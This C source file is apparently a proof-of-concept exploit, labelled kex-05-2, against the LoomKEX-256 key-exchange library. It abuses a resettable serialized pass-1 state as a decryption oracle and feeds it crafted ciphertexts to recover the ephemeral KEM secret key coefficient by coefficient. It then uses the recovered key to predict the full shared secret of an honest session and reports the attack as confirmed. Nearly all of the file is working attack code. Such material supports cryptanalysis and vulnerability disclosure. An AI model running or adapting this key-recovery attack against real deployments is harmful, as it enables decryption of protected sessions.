/* LoomKEX-256 pass-1-state rollback key recovery.
 *
 * This driver treats a saved serialized pass-1 state as a resettable protocol
 * oracle.  Every query is a complete AKE pass-3 call on an attacker-created
 * pass-2 message.  Sparse ciphertexts recover the ephemeral Loom-KEM secret
 * coefficient by coefficient.  The recovered key then decapsulates an honest
 * responder ciphertext and predicts the complete AKE shared secret.
 */
#define _POSIX_C_SOURCE 200809L

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "drng.h"
#include "KEX_LoomKEX-256.h"
#include "kem.h"
#include "polyvec.h"
#include "prf_mac.h"
#include "symmetric.h"

#if WEAVER_N != 256 || WEAVER_K != 4 || LOOM_KEM_DU != 9 || LOOM_KEM_DV != 4
#error "This proof of concept is specialized to LoomKEX-256"
#endif

DRNG_ctx drng_algorithm;

enum {
    SEED_BYTES = 64,
    U_BYTES = WEAVER_POLYVECCOMPRESSEDBYTES,
    BODY_BYTES = WEAVER_CIPHERTEXTBODYBYTES,
};

typedef struct {
    unsigned char *ska, *pkb, *state, *state_work, *m1, *m2, *m3;
    unsigned long long ska_n, pkb_n, state_n, m1_n;
    uint64_t queries, accepts;
} oracle_t;

static void set_bits_le(unsigned char *out, size_t bit_offset,
                        unsigned int width, unsigned int value)
{
    for (unsigned int bit = 0; bit < width; bit++) {
        size_t at = bit_offset + bit;
        unsigned char mask = (unsigned char)(1u << (at & 7));
        if ((value >> bit) & 1u) out[at >> 3] |= mask;
        else out[at >> 3] &= (unsigned char)~mask;
    }
}

static void set_v_nibble(unsigned char *body, unsigned int coefficient,
                         unsigned int value)
{
    unsigned char *at = body + U_BYTES + coefficient / 2;
    if (coefficient & 1) *at = (unsigned char)((*at & 0x0f) | (value << 4));
    else *at = (unsigned char)((*at & 0xf0) | value);
}

static void make_tagged_message(oracle_t *o, unsigned int component,
                                unsigned int secret_index, unsigned int u_code,
                                int u_sign, const int8_t known[WEAVER_K][WEAVER_N],
                                int mask_known_signs, unsigned int target_v)
{
    unsigned char *ct = o->m2 + LOOM_SPIBYTES;
    unsigned char *body = ct;
    unsigned char tag_input[WEAVER_INDCPA_MSGBYTES + BODY_BYTES];
    unsigned int rotation = (WEAVER_N - secret_index) % WEAVER_N;

    memset(o->m2, 0, LOOM_SPIBYTES + LOOM_KEM_CTBYTES + LOOM_NONCEBYTES);
    memcpy(o->m2, o->m1, LOOM_SPIHALFBYTES);
    memset(o->m2 + LOOM_SPIHALFBYTES, 0x42, LOOM_SPIHALFBYTES);
    memset(body, 0, BODY_BYTES);

    if (mask_known_signs) {
        for (unsigned int out = 0; out < WEAVER_N; out++) {
            unsigned int source;
            int wrap_sign;
            if (out >= rotation) {
                source = out - rotation;
                wrap_sign = 1;
            } else {
                source = out + WEAVER_N - rotation;
                wrap_sign = -1;
            }
            int product_sign = u_sign * wrap_sign * known[component][source];
            set_v_nibble(body, out, product_sign < 0 ? 12u : 4u);
        }
    }
    set_v_nibble(body, 0, target_v);

    unsigned int encoded_u = u_sign > 0 ? u_code : (1u << LOOM_KEM_DU) - u_code;
    size_t coefficient = (size_t)component * WEAVER_N + rotation;
    set_bits_le(body, coefficient * LOOM_KEM_DU, LOOM_KEM_DU, encoded_u);

    memset(tag_input, 0, WEAVER_INDCPA_MSGBYTES);
    memcpy(tag_input + WEAVER_INDCPA_MSGBYTES, body, BODY_BYTES);
    shake256(ct + BODY_BYTES, WEAVER_TAGBYTES, tag_input, sizeof(tag_input));
    memset(o->m2 + LOOM_SPIBYTES + LOOM_KEM_CTBYTES, 0x24, LOOM_NONCEBYTES);
}

static int oracle_query(oracle_t *o)
{
    unsigned long long state_n = o->state_n, m3_n = 0;
    memcpy(o->state_work, o->state, o->state_n);
    int ret = kex_generate_pass3_msg_a(
        o->ska, o->ska_n, o->pkb, o->pkb_n,
        o->m2, LOOM_SPIBYTES + LOOM_KEM_CTBYTES + LOOM_NONCEBYTES,
        o->state_work, &state_n, o->m3, &m3_n);
    o->queries++;
    if (ret == 0) o->accepts++;
    return ret == 0;
}

static int signed_probe(oracle_t *o, unsigned int component,
                        unsigned int index, int orientation,
                        const int8_t recovered[WEAVER_K][WEAVER_N])
{
    int ring_sign = index == 0 ? 1 : -1;
    make_tagged_message(o, component, index, 1, orientation * ring_sign,
                        recovered, 0, 4);
    return oracle_query(o);
}

/* Return whether |s| is at least threshold, for threshold in 2..8. */
static int magnitude_probe(oracle_t *o, unsigned int component,
                           unsigned int index, unsigned int threshold,
                           const int8_t recovered[WEAVER_K][WEAVER_N])
{
    static const unsigned int u_code_for_threshold[9] = {
        0, 0, 16, 11, 8, 7, 6, 5, 4
    };
    int ring_sign = index == 0 ? 1 : -1;
    int secret_sign = recovered[component][index] < 0 ? -1 : 1;
    int u_sign = secret_sign * ring_sign;
    make_tagged_message(o, component, index, u_code_for_threshold[threshold],
                        u_sign, recovered, 1, 5);
    return oracle_query(o);
}

static int recover_secret(oracle_t *o, int8_t recovered[WEAVER_K][WEAVER_N])
{
    memset(recovered, 0, WEAVER_K * WEAVER_N);

    /* A coefficient is positive/negative/zero according to the two boundary
     * tests (s >= 0, s <= 0).  The small u=15 keeps every non-target output
     * safely in the zero decoding region. */
    for (unsigned int component = 0; component < WEAVER_K; component++) {
        for (unsigned int index = 0; index < WEAVER_N; index++) {
            int nonnegative = signed_probe(o, component, index, 1, recovered);
            int nonpositive = signed_probe(o, component, index, -1, recovered);
            if (!nonnegative && !nonpositive) return -1;
            recovered[component][index] = nonnegative && nonpositive ? 0
                : nonnegative ? 1 : -1;
        }
    }

    /* Each nonzero CBD_8 coefficient is in {+/-1,...,+/-8}.  Three binary
     * threshold probes recover its magnitude. */
    for (unsigned int component = 0; component < WEAVER_K; component++) {
        for (unsigned int index = 0; index < WEAVER_N; index++) {
            int sign = recovered[component][index];
            if (!sign) continue;
            unsigned int magnitude;
            if (magnitude_probe(o, component, index, 5, recovered)) {
                if (magnitude_probe(o, component, index, 7, recovered))
                    magnitude = magnitude_probe(o, component, index, 8, recovered) ? 8 : 7;
                else
                    magnitude = magnitude_probe(o, component, index, 6, recovered) ? 6 : 5;
            } else {
                if (magnitude_probe(o, component, index, 3, recovered))
                    magnitude = magnitude_probe(o, component, index, 4, recovered) ? 4 : 3;
                else
                    magnitude = magnitude_probe(o, component, index, 2, recovered) ? 2 : 1;
            }
            recovered[component][index] = (int8_t)(sign * (int)magnitude);
        }
    }
    return 0;
}

static void pack_recovered_sk(unsigned char sk[WEAVER_SECRETKEYBYTES],
                              const int8_t recovered[WEAVER_K][WEAVER_N])
{
    polyvec value = {0};
    for (unsigned int component = 0; component < WEAVER_K; component++)
        for (unsigned int index = 0; index < WEAVER_N; index++)
            value.vec[component].coeffs[index] = recovered[component][index];
    polyvec_ntt(&value);
    polyvec_tobytes(sk, &value);
}

static void print_hex(const char *name, const unsigned char *value, size_t n)
{
    printf("%s=", name);
    for (size_t i = 0; i < n; i++) printf("%02x", value[i]);
    putchar('\n');
}

int main(void)
{
    const char *seed_tweak_text = getenv("LOOM_ATTACK_SEED_TWEAK");
    char *seed_tweak_end = NULL;
    uint64_t seed_tweak = seed_tweak_text
        ? strtoull(seed_tweak_text, &seed_tweak_end, 0) : 0;
    if (seed_tweak_text && (!seed_tweak_end || *seed_tweak_end)) {
        fprintf(stderr, "invalid LOOM_ATTACK_SEED_TWEAK\n");
        return 2;
    }
    unsigned char seed[SEED_BYTES];
    for (unsigned int i = 0; i < sizeof(seed); i++)
        seed[i] = (unsigned char)(0xa5 ^ i ^ (seed_tweak >> (8 * (i & 7))));
    if (init_random_number(&drng_algorithm, seed, sizeof(seed))) return 2;

    unsigned long long pk_cap = kex_get_pk_len_bytes(), sk_cap = kex_get_sk_len_bytes();
    unsigned long long sta_cap = kex_get_sta_len_bytes(), stb_cap = kex_get_stb_len_bytes();
    unsigned long long msg_cap = kex_get_total_msg_len_bytes(), ss_cap = kex_get_ss_len_bytes();
#define NEW(name, size) unsigned char *name = calloc((size), 1); if (!(name)) return 2
    NEW(pka, pk_cap); NEW(ska, sk_cap); NEW(pkb, pk_cap); NEW(skb, sk_cap);
    NEW(sta, sta_cap); NEW(sta_base, sta_cap); NEW(sta_work, sta_cap); NEW(stb, stb_cap);
    NEW(m1, msg_cap); NEW(m2, msg_cap); NEW(m3, msg_cap); NEW(m4, msg_cap);
    NEW(ssa, ss_cap); NEW(ssb, ss_cap);
#undef NEW
    unsigned long long pka_n=pk_cap, ska_n=sk_cap, pkb_n=pk_cap, skb_n=sk_cap;
    unsigned long long sta_n=sta_cap, stb_n=stb_cap, m1_n=0, m2_n=0, m3_n=0, m4_n=0;
    unsigned long long ssa_n=ss_cap, ssb_n=ss_cap;

    if (kex_init_a(pka,&pka_n,ska,&ska_n,sta,&sta_n) ||
        kex_init_b(pkb,&pkb_n,skb,&skb_n,stb,&stb_n) ||
        kex_generate_pass1_msg_a(ska,ska_n,pkb,pkb_n,sta,&sta_n,m1,&m1_n)) return 2;
    memcpy(sta_base, sta, sta_n);

    oracle_t oracle = {ska, pkb, sta_base, sta_work, m1, m2, m3,
                       ska_n, pkb_n, sta_n, m1_n, 0, 0};
    int saved_stdout = dup(STDOUT_FILENO);
    int null_fd = open("/dev/null", O_WRONLY);
    if (saved_stdout < 0 || null_fd < 0 || dup2(null_fd, STDOUT_FILENO) < 0) return 2;
    close(null_fd);

    int8_t recovered[WEAVER_K][WEAVER_N];
    int recovery_status = recover_secret(&oracle, recovered);
    fflush(stdout);
    if (dup2(saved_stdout, STDOUT_FILENO) < 0) return 2;
    close(saved_stdout);
    if (recovery_status) {
        fprintf(stderr, "coefficient recovery produced an impossible oracle pair\n");
        return 1;
    }

    unsigned char recovered_sk[WEAVER_SECRETKEYBYTES], recovered_k[WEAVER_SSBYTES];
    pack_recovered_sk(recovered_sk, recovered);

    /* Generate an honest response only after recovery, then finish all four
     * passes using the original pass-1 state. */
    if (kex_generate_pass2_msg_b(skb,skb_n,pka,pka_n,m1,m1_n,stb,&stb_n,m2,&m2_n)) return 2;
    if (crypto_kem_dec_rigid(recovered_k, m2 + LOOM_SPIBYTES, recovered_sk)) {
        fprintf(stderr, "recovered secret did not decapsulate the honest pass-2 ciphertext\n");
        return 1;
    }
    memcpy(sta, sta_base, sta_n);
    m3_n = 0;
    if (kex_generate_pass3_msg_a(ska,ska_n,pkb,pkb_n,m2,m2_n,sta,&sta_n,m3,&m3_n) ||
        kex_generate_pass4_msg_b(skb,skb_n,pka,pka_n,m3,m3_n,stb,&stb_n,m4,&m4_n) != 1 ||
        kex_derive_ss_a(ska,ska_n,pkb,pkb_n,m4,m4_n,sta,sta_n,ssa,&ssa_n) ||
        kex_derive_ss_b(skb,skb_n,pka,pka_n,m3,m3_n,stb,stb_n,ssb,&ssb_n)) return 2;

    unsigned char predicted[LOOM_KEM_SSBYTES], mki[LOOM_MACBYTES], mkr[LOOM_MACBYTES];
    const unsigned char *ni = m1 + LOOM_SPIBYTES + LOOM_KEM_PKBYTES;
    const unsigned char *nr = m2 + LOOM_SPIBYTES + LOOM_KEM_CTBYTES;
    if (loom_prf_derive(predicted, mki, mkr, recovered_k, ni, nr)) return 2;
    if (ssa_n != ssb_n || ssa_n != sizeof(predicted) ||
        memcmp(ssa, ssb, ssa_n) || memcmp(ssa, predicted, ssa_n)) {
        fprintf(stderr, "recovered KEM key did not predict the whole-AKE shared secret\n");
        return 1;
    }

    unsigned char sk_digest[32];
    shake256(sk_digest, sizeof(sk_digest), recovered_sk, sizeof(recovered_sk));
    printf("ATTACK kex-05-2 LoomKEX-256 CONFIRMED rollback_queries=%llu accepts=%llu "
           "recovered_coefficients=%u honest_passes=4 shared_secret_match=yes\n",
           (unsigned long long)oracle.queries, (unsigned long long)oracle.accepts,
           WEAVER_K * WEAVER_N);
    print_hex("recovered_ephemeral_sk_digest", sk_digest, sizeof(sk_digest));
    print_hex("shared_secret", ssa, ssa_n);
    free(pka); free(ska); free(pkb); free(skb);
    free(sta); free(sta_base); free(sta_work); free(stb);
    free(m1); free(m2); free(m3); free(m4); free(ssa); free(ssb);
    return 0;
}
